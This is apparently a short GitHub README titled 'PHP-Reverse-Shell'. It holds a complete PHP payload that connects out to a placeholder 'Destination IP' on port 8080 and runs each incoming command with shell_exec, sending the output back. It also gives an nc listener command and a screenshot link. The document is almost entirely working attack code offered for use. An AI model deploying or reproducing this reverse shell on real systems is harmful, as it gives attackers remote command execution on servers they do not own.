# PHP-Reverse-Shell
# Payload
```php
<?php
$sock = fsockopen("Destination IP", 8080);
if ($sock) {
    fwrite($sock, "github.com/9dl\n");
    fwrite($sock, "Connected!\n");
    while (!feof($sock)) {
        $cmd = trim(fgets($sock));
        if ($cmd === 'exit') break;
        $output = shell_exec($cmd . " 2>&1");
        fwrite($sock, $output);
    }
    fclose($sock);
}
?>
```
# Listener
```php
nc -lvnp 8080
```
# Showcase
![image](https://github.com/user-attachments/assets/0b99c7d1-4695-4e88-b367-6d62e7f5ae0c)
